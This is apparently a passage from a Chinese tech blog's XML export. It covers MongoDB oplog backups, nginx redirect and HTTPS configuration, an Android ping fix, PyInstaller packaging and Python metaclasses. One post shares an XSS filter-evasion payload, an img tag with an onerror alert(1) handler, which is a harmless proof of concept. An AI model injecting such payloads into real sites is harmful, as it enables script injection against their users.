{ &quot;ts&quot; : Timestamp(1584972163, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;2195348018262890539&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:43.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972173, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-945081611143254792&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:02:53.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972183, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-8550993957527781683&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:03:03.577Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972193, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;2027336719720729041&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:03:13.578Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972203, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;8383046467552376073&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:03:23.578Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972213, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;-2718017147947765099&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:03:33.578Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
{ &quot;ts&quot; : Timestamp(1584972223, 1), &quot;t&quot; : NumberLong(1), &quot;h&quot; : NumberLong(&quot;4265940161146074795&quot;), &quot;v&quot; : 2, &quot;op&quot; : &quot;n&quot;, &quot;ns&quot; : &quot;&quot;, &quot;wall&quot; : ISODate(&quot;2020-03-23T14:03:43.578Z&quot;), &quot;o&quot; : { &quot;msg&quot; : &quot;periodic noop&quot; } }
Type &quot;it&quot; for more
</code></pre><p>可以看到，<code>oplog.rs</code>集合里已经有数据了。</p>
<p>备份数据命令：</p>
<pre><code class="bash">$ mongodump -h ${mongo_server} --port ${mongo_port} -o ${save_dir} -u ${username} -p ${password} --authenticationDatabase admin --oplog
</code></pre>
<blockquote>
<p>使用<code>--oplog</code>参数时不能指定数据库，只能全量备份</p>
</blockquote>
<p>还原数据命令：</p>
<pre><code class="bash">$ mongorestore -h ${mongo_server} --port ${mongo_port} -u ${username} -p ${password} --authenticationDatabase admin --oplogReplay --dir ${save_dir}
</code></pre>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>今天学了个新技能</title>
    <url>/2017/01/07/new-web-skill/</url>
    <content><![CDATA[<pre><code>&lt;img/src=\&quot;#\&quot;/onerror=alert(1)&gt;
</code></pre><p>这样子写是可以正常解析的，至少Chrome是可以的</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Nexus5 进入recovery提示“无命令”</title>
    <url>/2017/01/07/nexus5-recovery/</url>
    <content><![CDATA[<p>每次都要刷入recovery，然后使用音量键选择“Recovery mode”，按电源键进入</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Nexus5</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx自动重定向</title>
    <url>/2020/09/24/nginx-302-to-200/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在使用Nginx作为反向代理的时候，如果源服务返回了<code>30x</code>（301、302、303、307等）返回码，需要用户再重新发送一次HTTP请求。但此时有可能出现用户不能直接访问重定向后的URL，就需要Nginx能自动进行重定向，读取新的URL后，通过200返回码返回真正的内容。<br>本文主要就是研究了怎么配置Nginx以实现这样的功能。</p>
<h2 id="0x01-使用错误处理进行反代"><a href="#0x01-使用错误处理进行反代" class="headerlink" title="0x01 使用错误处理进行反代"></a>0x01 使用错误处理进行反代</h2><p>Ngnix提供了<code>error_page</code>错误处理机制，允许用户在出现指定错误时进行自己的处理逻辑。</p>
<pre><code class="conf">error_page 403 404 =200 /error.html;
location = /error.html {
    root /data/www;
}  
</code></pre>
<p>这样可以在出现<code>403</code>、<code>404</code>错误时返回<code>error.html</code>页面的内容，同时用户看到的还是<code>200</code>返回码。</p>
<p>事实上，<code>error_page</code>也支持指定一个处理函数。</p>
<pre><code class="conf">resolver 10.1.1.1;

location / {
    proxy_pass http://xxx.com/;
    error_page 301 302 303 = @handle_redirect;
}

location @handle_redirect {
    proxy_pass $upstream_http_location;
}
</code></pre>
<p>这样Nginx就可以自动请求重定向后的URL了。</p>
<p><code>resolver 10.1.1.1;</code>这行是为了指定DNS服务器，否则会有<code>no resolver defined to resolve xxx.com while sending to client</code>的报错。</p>
<h2 id="0x02-嵌套重定向"><a href="#0x02-嵌套重定向" class="headerlink" title="0x02 嵌套重定向"></a>0x02 嵌套重定向</h2><p>但是如果请求重定向后的URL返回的还是<code>30x</code>会怎样呢？按照现在的写法，Nginx并不会继续请求了。这种情况可以通过多次配置<code>error_page</code>来解决。</p>
<pre><code class="conf">location / {
    proxy_pass http://xxx.com/;
    error_page 301 302 303 = @handle_redirect;
}

location @handle_redirect {
    proxy_pass $upstream_http_location;
    error_page 307 = @handle_redirect_307;
}

location @handle_redirect_307 {
    return 302 &quot;http://yyy.com$upstream_http_location&quot;;
}
</code></pre>
<p>测试发现，现在这种写法并不会引起多次自动重定向，这是为什么呢？</p>
<p>这是因为Nginx默认只会处理一次错误码，要支持多次，需要添加以下配置项：</p>
<pre><code class="conf">recursive_error_pages on;
</code></pre>
<h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>Nginx最大的优势就是高效，如果自己实现服务来支持这个自动跳转特性的话，成本会增加，性能也不见得会比Nginx好。因此，对于这种场景，优先考虑通过配置Nginx来解决是最佳方案。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>NGINX部署HTTPS</title>
    <url>/2018/06/03/nginx-https/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>nginx是一款高性能的Web服务器，可以用作反向代理和负载均衡。随着HTTPS的不断推进，越来越多的网站都开始转到HTTPS方式，HTTP仅仅作为重定向到HTTPS的途径。</p>
<p>本文介绍了如何在Ubuntu 16.04服务器上搭建基于nginx的HTTPS服务器，并且支持SNI。</p>
<h2 id="0x01-准备域名和HTTPS证书"><a href="#0x01-准备域名和HTTPS证书" class="headerlink" title="0x01 准备域名和HTTPS证书"></a>0x01 准备域名和HTTPS证书</h2><p>域名分为免费域名和收费域名</p>
<h3 id="免费域名"><a href="#免费域名" class="headerlink" title="免费域名"></a>免费域名</h3><p>免费域名包含一级域名和二级域名。</p>
<p>一级域名推荐的是：<a href="http://www.dot.tk/en/index.html?lang=en" target="_blank" rel="noopener">TK域名</a>，每次申请12个月以下是免费的，到期前<code>14天</code>可以免费续期。不过网上说可能会被收回，不过我还没有遇到（估计是我访问量太小吧）。</p>
<p>二级域名就比较多了，但是质量参差不齐，很多只能修改<code>A记录</code>，而且很有可能子域名被用作非法用途导致被列入黑名单，浏览器访问时可能会有拦截提示。</p>
<h3 id="收费域名"><a href="#收费域名" class="headerlink" title="收费域名"></a>收费域名</h3><p>如果可以的话，尽量还是购买收费的域名，比如<a href="https://buy.cloud.tencent.com/domain" target="_blank" rel="noopener">腾讯云</a>，经常会有活动（1元购买域名之类）。要绑定国内服务器，域名还需要备案，使用腾讯云的话备案只要提供少量信息，不用自己邮寄材料，总共花了大概40天左右。</p>
<p>证书可以分为自签名证书（Self-Signed Certificate）、个人网站证书、企业网站证书。</p>
<h3 id="自签名证书"><a href="#自签名证书" class="headerlink" title="自签名证书"></a>自签名证书</h3><p>该类型证书可以通过以下命令行创建：</p>
<pre><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt -subj &#39;/CN=&lt;SERVER-IP&gt;&#39;
</code></pre><p>完成后会在当前目录创建私钥文件（privateKey.key）和证书文件（certificate.crt）。部署后浏览器会提示不安全的证书。</p>
<p><img src="/images/https_not_secure.png" alt></p>
<p>由于该类型证书无法通过验证，通常只在某些特殊场景下使用（如HTTPS抓包）。</p>
<h3 id="个人网站证书"><a href="#个人网站证书" class="headerlink" title="个人网站证书"></a>个人网站证书</h3><p>通常可以申请免费的个人网站证书，如腾讯云（<a href="https://buy.cloud.tencent.com/ssl" target="_blank" rel="noopener">https://buy.cloud.tencent.com/ssl</a>）。该类型证书基本可以满足个人使用，建议使用。</p>
<p><img src="/images/https_secure.png" alt></p>
<h3 id="企业网站证书"><a href="#企业网站证书" class="headerlink" title="企业网站证书"></a>企业网站证书</h3><p>该类型证书可以提供企业认证，泛域名等，收费一般较高。不建议个人使用。</p>
<h2 id="0x02-部署服务器"><a href="#0x02-部署服务器" class="headerlink" title="0x02 部署服务器"></a>0x02 部署服务器</h2><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><pre><code>apt install nginx -y
</code></pre><p>使用如下命令确认是否支持<code>HTTPS</code>和<code>SNI</code>。</p>
<pre><code>root@VM-171-28-ubuntu:/# nginx -V
nginx version: nginx/1.10.3 (Ubuntu)
built with OpenSSL 1.0.2g  1 Mar 2016
TLS SNI support enabled
configure arguments: --with-cc-opt=&#39;-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2&#39; --with-ld-opt=&#39;-Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now&#39; --prefix=/usr/share/nginx --conf-path=/etc/nginx/nginx.conf --http-log-path=/var/log/nginx/access.log --error-log-path=/var/log/nginx/error.log --lock-path=/var/lock/nginx.lock --pid-path=/run/nginx.pid --http-client-body-temp-path=/var/lib/nginx/body --http-fastcgi-temp-path=/var/lib/nginx/fastcgi --http-proxy-temp-path=/var/lib/nginx/proxy --http-scgi-temp-path=/var/lib/nginx/scgi --http-uwsgi-temp-path=/var/lib/nginx/uwsgi --with-debug --with-pcre-jit --with-ipv6 --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_addition_module --with-http_dav_module --with-http_geoip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_image_filter_module --with-http_v2_module --with-http_sub_module --with-http_xslt_module --with-stream --with-stream_ssl_module --with-mail --with-mail_ssl_module --with-threads
</code></pre><p><code>TLS SNI support enabled</code>表示<code>SNI</code>已经启用;<code>--with-http_ssl_module</code>表示支持<code>HTTPS</code>。 </p>
<h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>将证书文件和私钥文件放到<code>/etc/nginx/ssl</code>目录下。在<code>/etc/nginx/conf.d</code>目录下创建<code>mysite.conf</code>文件。内容如下：</p>
<pre><code>server {
    listen 80;
    return 400;
}

server {
    listen 80;
    server_name mysite.com;
    return 301 https://$server_name$request_uri;
}

server{
    listen 443 default;
    ssl on;
    ssl_certificate /etc/nginx/ssl/default.crt;
    ssl_certificate_key /etc/nginx/ssl/default.key;
    return 400;
    access_log /data/log/nginx/default.access.log;
}

server{
    #比起默认的80 使用了443 默认 是ssl方式  多出default之后的ssl
    listen 443;
    #开启  如果把ssl on；这行去掉，ssl写在443端口后面。这样http和https的链接都可以用
    ssl on;
    #证书(公钥.发送到客户端的)
    ssl_certificate /etc/nginx/ssl/mysite.crt;
    #私钥,
    ssl_certificate_key /etc/nginx/ssl/mysite.key;
    #下面是绑定域名
    server_name mysite.com;

    location / {
        proxy_redirect off; #禁止跳转
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        #配置反向代理
        proxy_pass http://127.0.0.1:8081;
    }

    access_log /data/log/nginx/mysite.access.log;
}
</code></pre><p>前两个<code>server</code>配置项是为了已配置域名使用HTTP访问时，强制跳转到HTTPS；<code>ip</code>或未配置域名访问时，返回<code>400</code>错误。</p>
<p>第三个<code>server</code>配置项中使用了<code>default.crt</code>证书，这是个自签名证书，是为了当用户通过<code>ip</code>或未配置域名使用HTTPS访问时，能够返回<code>400</code>错误。本来是想做成SSL握手时只要发现没有传<code>SNI</code>或不支持的域名时，就直接断开连接。但是，发现貌似nginx不支持这一特性（<a href="https://serverfault.com/questions/794953/block-direct-access-to-webserver-ip-via-https" target="_blank" rel="noopener">参考此链接</a>)，只能使用这种折中的解决方法。</p>
<h3 id="重启nginx"><a href="#重启nginx" class="headerlink" title="重启nginx"></a>重启nginx</h3><pre><code>systemctl restart nginx
</code></pre><p>如果没有报错的话，HTTPS服务就可以正常访问了。</p>
<h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>使用nginx反向代理的优点是：可以使用nginx实现HTTPS，而自己的Web服务使用HTTP。这样，开发、调试都很方便，也便于使用负载均衡。</p>
<blockquote>
<p>我的博客即将搬运同步至腾讯云+社区，邀请大家一同入驻：<a href="https://cloud.tencent.com/developer/support-plan?invite_code=nl0eqa3ypzk8" target="_blank" rel="noopener">https://cloud.tencent.com/developer/support-plan?invite_code=nl0eqa3ypzk8</a> </p>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>nginx</tag>
        <tag>sni</tag>
      </tags>
  </entry>
  <entry>
    <title>运行ping命令报错误</title>
    <url>/2017/01/07/ping-error/</url>
    <content><![CDATA[<p>在三星S4上运行ping -c 4 <a href="http://www.qq.com" target="_blank" rel="noopener">www.qq.com</a> 命令报错  </p>
<blockquote>
<p>This version of ping should NOT run with privileges. Aborting  </p>
</blockquote>
<p>换成root权限执行也不行<br>原因是ping文件的权限设置有问题  </p>
<blockquote>
<p>-rwxr-sr-x root     net_raw     26060 2008-08-01 20:00 ping  </p>
</blockquote>
<p>使用<strong>chmod 755 ping</strong>修改权限即可</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ping</tag>
      </tags>
  </entry>
  <entry>
    <title>使用PyInstaller打包可执行文件</title>
    <url>/2018/12/21/pyinstaller/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前都是使用<code>py2exe</code>将Python程序打包成可执行文件，但是最近需要打包成<code>Macos</code>上的可执行程序。于是，选择了<code>py2app</code>，但是使用下来发现坑比较多，最终还是放弃了。</p>
<p>于是，将目光转向了<code>PyInstaller</code>，它可以同时支持Windows和Macos，并且使用方法差异也很小。</p>
<p>PyInstaller与py2exe的主要差异（Windows）：</p>
<ul>
<li><p>PyInstaller打包出来的是一个正常的exe；py2exe打包出来的既是exe，也是zip文件，可以进行解压</p>
</li>
<li><p>PyInstaller打包出来的程序在运行后会创建一个临时目录，把dll等文件解压到临时目录中；py2exe使用了内存加载dll的技术，可以在不解压dll的情况下直接加载，看上去更优雅一些</p>
</li>
</ul>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>测试过程使用了<code>virtualenv</code>创建的虚拟环境，可以保证测试过程不会影响到系统的Python环境。</p>
<pre><code class="bash">$ virtualenv .env
$ .env\Scripts\activate.bat（Windows）
$ source .env/bin/activate （类Unix）
$ pip install PyInstaller
$ pyinstaller
usage: pyinstaller [-h] [-v] [-D] [-F] [--specpath DIR] [-n NAME]
                   [--add-data &lt;SRC;DEST or SRC:DEST&gt;]
                   [--add-binary &lt;SRC;DEST or SRC:DEST&gt;] [-p DIR]
                   [--hidden-import MODULENAME]
                   [--additional-hooks-dir HOOKSPATH]
                   [--runtime-hook RUNTIME_HOOKS] [--exclude-module EXCLUDES]
                   [--key KEY] [-d [{all,imports,bootloader,noarchive}]] [-s]
                   [--noupx] [-c] [-w]
                   [-i &lt;FILE.ico or FILE.exe,ID or FILE.icns&gt;]
                   [--version-file FILE] [-m &lt;FILE or XML&gt;] [-r RESOURCE]
                   [--uac-admin] [--uac-uiaccess] [--win-private-assemblies]
                   [--win-no-prefer-redirects]
                   [--osx-bundle-identifier BUNDLE_IDENTIFIER]
                   [--runtime-tmpdir PATH] [--bootloader-ignore-signals]
                   [--distpath DIR] [--workpath WORKPATH] [-y]
                   [--upx-dir UPX_DIR] [-a] [--clean] [--log-level LEVEL]
                   scriptname [scriptname ...]
pyinstaller: error: too few arguments
</code></pre>
<h2 id="0x02-PyInstaller参数说明"><a href="#0x02-PyInstaller参数说明" class="headerlink" title="0x02 PyInstaller参数说明"></a>0x02 PyInstaller参数说明</h2><p>官方文档地址为：<a href="https://pyinstaller.readthedocs.io/en/stable/usage.html" target="_blank" rel="noopener">https://pyinstaller.readthedocs.io/en/stable/usage.html</a></p>
<p>常用参数含义如下：</p>
<pre><code>+--------------+----------------------------------------------+
|-h, --help    | 帮助信息                                      |
+-------------------------------------------------------------+
|-v, --version | 版本信息                                      |
+-------------------------------------------------------------+
|--distpath DIR| 打包文件的保存目录（默认：dist）                |
+-------------------------------------------------------------+
|--workpath WORKPATH| 临时文件的保存目录（默认：build）          |
+-------------------------------------------------------------+
|-y, --noconfirm    | 替换文件时无需确认                        |
+-------------------------------------------------------------+
|--upx-dir UPX_DIR  | UPX程序所在目录                          |
+-------------------------------------------------------------+
|-a, --ascii        | 不包含unicode编码支持                    |
+-------------------------------------------------------------+
|--clean            | 编译前先清理缓存和临时文件                |
+-------------------------------------------------------------+
|--log-level LEVEL  | 编译时的日志等级：TRACE, DEBUG, INFO,     |
|                   | WARN, ERROR, CRITICAL，默认是：INFO      |
+-------------------------------------------------------------+
|-D, --onedir       | 生成的所有文件保存到一个目录（默认）       |
+-------------------------------------------------------------+
|-F, --onefile      | 只生成一个文件（exe）                     |
+-------------------------------------------------------------+
|–specpath          | .spec文件保存目录（默认是当前目录）        |
+-------------------------------------------------------------+
|-n                 | 生成的文件名（默认是指定的Python脚本名称） |
+-------------------------------------------------------------+
|-i                 | 指定程序图标 Windows: *.ico Macos: *.icns|
+-------------------------------------------------------------+
|-w                 | 不显示命令行窗口                         |
+-------------------------------------------------------------+
</code></pre><p>一般可以使用以下命令行创建一个GUI的可执行文件：</p>
<pre><code>pyinstaller -F -w main.py -n demo
</code></pre><p>执行后，可以在<code>dist</code>目录下创建<code>demo.exe</code>（Windows）或<code>demo.app</code>（Macos）</p>
<h2 id="0x03-指定程序图标"><a href="#0x03-指定程序图标" class="headerlink" title="0x03 指定程序图标"></a>0x03 指定程序图标</h2><p>一般可执行程序都会包含个性化的图标，但是Windows和Macos使用了不同的图标格式。Windows上一般是常见的<code>*.ico</code>格式；而Macos上则是<code>*.icns</code></p>
<p>ico图标的制作可以使用一些在线网站或小工具</p>
<p>制作icns图标可以使用如下方法（Macos）：</p>
<ol>
<li><p>准备好一张长宽相等的png图片（最好背景透明），重命名为<code>pic.png</code></p>
</li>
<li><p>创建目录<code>tmp.iconset</code></p>
</li>
<li><p>执行以下命令，生成图标集</p>
</li>
</ol>
<pre><code class="bash">sips -z 16 16     pic.png --out tmp.iconset/icon_16x16.png
sips -z 32 32     pic.png --out tmp.iconset/icon_16x16@2x.png
sips -z 32 32     pic.png --out tmp.iconset/icon_32x32.png
sips -z 64 64     pic.png --out tmp.iconset/icon_32x32@2x.png
sips -z 128 128   pic.png --out tmp.iconset/icon_128x128.png
sips -z 256 256   pic.png --out tmp.iconset/icon_128x128@2x.png
sips -z 256 256   pic.png --out tmp.iconset/icon_256x256.png
sips -z 512 512   pic.png --out tmp.iconset/icon_256x256@2x.png
sips -z 512 512   pic.png --out tmp.iconset/icon_512x512.png
sips -z 1024 1024 pic.png --out tmp.iconset/icon_512x512@2x.png
</code></pre>
<ol start="4">
<li>执行以下命令创建icns图标文件</li>
</ol>
<pre><code>$ iconutil -c icns tmp.iconset -o pic.icns
</code></pre><p>指定程序图标只要在命令行后面增加参数：</p>
<pre><code>-i pic.icon/pic.icns
</code></pre><h2 id="0x04-添加数据文件"><a href="#0x04-添加数据文件" class="headerlink" title="0x04 添加数据文件"></a>0x04 添加数据文件</h2><p>程序中有时需要用到一些数据文件，可以使用<code>--add-data=src;dst</code>（Windows）或<code>--add-data=src:ds</code>（类Unix）参数将<code>src</code>路径对应的<code>文件（夹）</code>拷贝到<code>dst</code>指向的路径，程序中可以使用<code>dst</code>路径进行访问。</p>
<p>由于PyInstaller打包出来的程序在运行时会解压数据文件到临时目录中，因此程序中可以直接访问这些数据文件；而py2exe则需要手动将数据文件从程序体中解压出来使用。</p>
<h2 id="0x05-添加版本信息（Windows）"><a href="#0x05-添加版本信息（Windows）" class="headerlink" title="0x05 添加版本信息（Windows）"></a>0x05 添加版本信息（Windows）</h2><p>PyInstaller允许在Windows上给程序添加版本信息，使用<code>--version-file version_file.txt</code>参数进行添加。</p>
<p><code>version_file.txt</code>文件的制作方法如下：</p>
<ol>
<li>根据已有的exe文件生成版本文件模版</li>
</ol>
<pre><code>$ pyi-grab_version demo.exe version_file.txt
</code></pre><ol start="2">
<li>修改<code>version_file.txt</code>中的文件名、厂商、版本等信息，并保存</li>
</ol>
<p>为了动态修改版本信息，也可以使用脚本动态生成版本文件</p>
<h2 id="0x06-打包成app（-Macos）"><a href="#0x06-打包成app（-Macos）" class="headerlink" title="0x06 打包成app（ Macos）"></a>0x06 打包成app（ Macos）</h2><p>在Macos上使用PyInstaller打包出来的是一个目录，可以直接压缩成zip文件给其他人使用，但更多的是打包成<code>dmg</code>格式。这可以使用<code>App2Dmg</code>这款应用完成。</p>
<p><img src="/images/app2dmg.jpg" alt></p>
<p>选择应用目录和要保存的目录后，就会生成<code>.dmg</code>文件了</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中动态创建类的方法</title>
    <url>/2018/07/26/python-dynamic-create-class/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在Python中，类也是作为一种对象存在的，因此可以在运行时动态创建类，这也是Python灵活性的一种体现。</p>
<p>本文介绍了如何使用<code>type</code>动态创建类，以及相关的一些使用方法与技巧。</p>
<h1 id="0x01-类的本质"><a href="#0x01-类的本质" class="headerlink" title="0x01 类的本质"></a>0x01 类的本质</h1><p>何为类？类是对现实生活中一类具有共同特征的事物的抽象，它描述了所创建的对象共同的属性和方法。在常见的编译型语言（如<code>C++</code>）中，类在编译的时候就已经确定了，运行时是无法动态创建的。那么Python是如何做到的呢？</p>
<p>来看下面这段代码：</p>
<pre><code class="python">class A(object):
    pass

print(A)
print(A.__class__)

</code></pre>
<p>在Python2中执行结果如下：</p>
<pre><code>&lt;class &#39;__main__.A&#39;&gt;
&lt;type &#39;type&#39;&gt;
</code></pre><p>在Python3中执行结果如下：</p>
<pre><code>&lt;class &#39;__main__.A&#39;&gt;
&lt;class &#39;type&#39;&gt;
</code></pre><p>可以看出，类<code>A</code>的类型是<code>type</code>，也就是说:<code>type</code>实例化后是<code>类</code>，<code>类</code>实例化后是<code>对象</code>。</p>
<h1 id="0x02-使用type动态创建类"><a href="#0x02-使用type动态创建类" class="headerlink" title="0x02 使用type动态创建类"></a>0x02 使用<code>type</code>动态创建类</h1><p><code>type</code>的参数定义如下：</p>
<blockquote>
<p>type(name, bases, dict)</p>
</blockquote>
<blockquote>
<p><code>name</code>: 生成的类名<br><code>bases</code>: 生成的类基类列表，类型为tuple<br><code>dict</code>: 生成的类中包含的属性或方法</p>
</blockquote>
<p>例如：可以使用以下方法创建一个类<code>A</code></p>
<pre><code class="python">cls = type(&#39;A&#39;, (object,), {&#39;__doc__&#39;: &#39;class created by type&#39;})

print(cls)
print(cls.__doc__)
</code></pre>
<p>输出结果如下：</p>
<pre><code>&lt;class &#39;__main__.A&#39;&gt;
class created by type
</code></pre><p>可以看出，这样创建的类与静态定义的类基本没有什么差别，使用上还更灵活。</p>
<p>这种方法的使用场景之一是：</p>
<blockquote>
<p>有些地方需要传入一个类作为参数，但是类中会用到某些受外界影响的变量；虽然使用全局变量可以解决这个问题，但是比较丑陋。此时，就可以使用这种方法动态创建一个类来使用。</p>
</blockquote>
<p>以下是一个使用的示例：</p>
<pre><code class="python">
import socket
try:
    import SocketServer
except ImportError:
    # python3
    import socketserver as SocketServer

class PortForwardingRequestHandler(SocketServer.BaseRequestHandler):
    &#39;&#39;&#39;处理端口转发请求
    &#39;&#39;&#39;

    def handle(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(self.server) # self.server是在动态创建类时传入的
        # 连接目标服务器，并转发数据
        # 以下代码省略...

def gen_cls(server):
    &#39;&#39;&#39;动态创建子类
    &#39;&#39;&#39;
    return type(&#39;%s_%s&#39; % (ProxyRequestHandler.__name__, server), (PortForwardingRequestHandler, object), {&#39;server&#39;: server})


server = SocketServer.ThreadingTCPServer((&#39;127.0.0.1&#39;, 8080), gen_cls((&#39;www.qq.com&#39;, 80)))
server.serve_forever()
</code></pre>
<p>在上面的例子中，由于目标服务器地址是由用户传入的，而<code>PortForwardingRequestHandler</code>类的实例化是在<code>ThreadingTCPServer</code>里实现的，我们没法控制。因此，使用动态创建类的方法可以很好地解决这个问题。</p>
<h1 id="0x03-使用元类（metaclass）"><a href="#0x03-使用元类（metaclass）" class="headerlink" title="0x03 使用元类（metaclass）"></a>0x03 使用元类（<code>metaclass</code>）</h1><p>类是实例的模版，而元类是类的模版。通过元类可以创建出类，类的默认元类是<code>type</code>，所有元类必须是<code>type</code>的子类。</p>
<p>下面是元类的一个例子：</p>
<pre><code class="python">import struct

class MetaClass(type):
    def __init__(cls, name, bases, attrd):
        super(MetaClass, cls).__init__(name, bases, attrd)

    def __mul__(self, num):
        return type(&#39;%s_Array_%d&#39; % (self.__name__, num), (ArrayTypeBase,), {&#39;obj_type&#39;: self, &#39;array_size&#39;: num, &#39;size&#39;: self.size * num})

class IntTypeBase(object):
    &#39;&#39;&#39;类型基类
    &#39;&#39;&#39;
    __metaclass__ = MetaClass
    size = 0
    format = &#39;&#39;  # strcut格式

    def __init__(self, val=0):
        if isinstance(val, str): val = int(val)
        if not isinstance(val, int):
            raise TypeError(&#39;类型错误：%s&#39; % type(val))
        self._net_order = True  # 默认存储的为网络序数据
        self.value = val
        self._num = 1

    def __str__(self):
        return &#39;%d(%s)&#39; % (self._val, self.__class__.__name__)

    def __cmp__(self, val):
        if isinstance(val, IntTypeBase):
            return cmp(self.value, val.value)
        elif isinstance(val, (int, long)):
            return cmp(self.value, val)
        elif isinstance(val, type(None)):
            return cmp(int(self.value), None)
        else:
            raise TypeError(&#39;类型错误：%s&#39; % type(val))

    def __int__(self):
        return int(self.value)

    def __hex__(self):
        return hex(self.value)

    def __index__(self):
        return self.value

    def __add__(self, val):
        return int(self.value + val)

    def __radd__(self, val):
        return int(val + self.value)

    def __sub__(self, val):
        return self.value - val

    def __rsub__(self, val):
        return val - self.value

    def __mul__(self, val):
        return self.value * val

    def __div__(self, val):
        return self.value / val

    def __mod__(self, val):
        return self.value % val

    def __rshift__(self, val):
        return self.value &gt;&gt; val

    def __and__(self, val):
        return self.value &amp; val

    @property
    def net_order(self):
        return self._net_order

    @net_order.setter
    def net_order(self, _net_order):
        self._net_order = _net_order

    @property
    def value(self):
        return self._val

    @value.setter
    def value(self, val):
        if not isinstance(val, int):
            raise TypeError(&#39;类型错误：%s&#39; % type(val))
        if val &lt; 0: raise ValueError(val)
        max_val = 256 ** (self.size) - 1
        if val &gt; max_val: raise ValueError(&#39;%d超过最大大小%d&#39; % (val, max_val))
        self._val = val

    def unpack(self, buff, net_order=True):
        &#39;&#39;&#39;从buffer中提取出数据
        &#39;&#39;&#39;
        if len(buff) &lt; self.size: raise ValueError(repr(buff))
        buff = buff[:self.size]
        fmt = self.format
        if not net_order: fmt = &#39;&lt;&#39; + fmt[1]
        self._val = struct.unpack(fmt, buff)[0]
        return self._val

    def pack(self, net_order=True):
        &#39;&#39;&#39;返回内存数据
        &#39;&#39;&#39;
        fmt = self.format
        if not net_order: fmt = &#39;&lt;&#39; + fmt[1]
        return struct.pack(fmt, self._val)

    @staticmethod
    def cls_from_size(size):
        &#39;&#39;&#39;从整型大小返回对应的类
        &#39;&#39;&#39;
        if size == 1:
            return c_uint8
        elif size == 2:
            return c_uint16
        elif size == 4:
            return c_uint32
        elif size == 8:
            return c_uint64
        else:
